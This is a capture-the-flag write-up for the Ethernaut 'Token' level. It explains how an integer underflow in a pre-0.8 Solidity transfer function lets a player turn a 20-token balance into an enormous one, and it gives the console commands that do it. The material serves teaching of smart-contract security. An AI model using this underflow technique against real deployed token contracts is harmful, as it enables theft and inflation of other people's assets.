---
layout: writeup
title: "Token"
level: "Beginner"
category: "Ethernaut"
description: "Exploit an integer underflow to bypass balance checks and generate trillions of tokens."
---

## Analysis

The vulnerability lies in the `transfer` function:
`require(balances[msg.sender] - _value >= 0);`

In versions of Solidity before 0.8.0, arithmetic operations were not checked for overflow or underflow by default.

**The Flaw:**
If you have a balance of 20 tokens and try to send 21 tokens, the calculation `20 - 21` does not result in `-1`. Instead, it "wraps around" to the maximum value of a `uint256`, which is $2^{256} - 1$. 



Because $2^{256} - 1$ is definitely greater than or equal to `0`, the `require` statement passes, and your balance becomes an astronomical number.

---

## Solution

You don't even need an attacker contract for this one; you can do it directly from the console by sending more tokens than you currently own.

**Step-by-Step:**

1. **Check Balance:** Confirm you have 20 tokens.
   `await contract.balanceOf(player)`
2. **Trigger Underflow:** Transfer 21 tokens to any other address (e.g., the contract address or a random wallet).
   `await contract.transfer('0x0000000000000000000000000000000000000000', 21)`
3. **Verify:** Check your balance again. It will now be a massive number.

**Console Commands:**

```javascript
// Send more than you have to trigger underflow
await contract.transfer(instance, 21);

// Check your new massive balance
const bal = await contract.balanceOf(player);
console.log("New Balance:", bal.toString());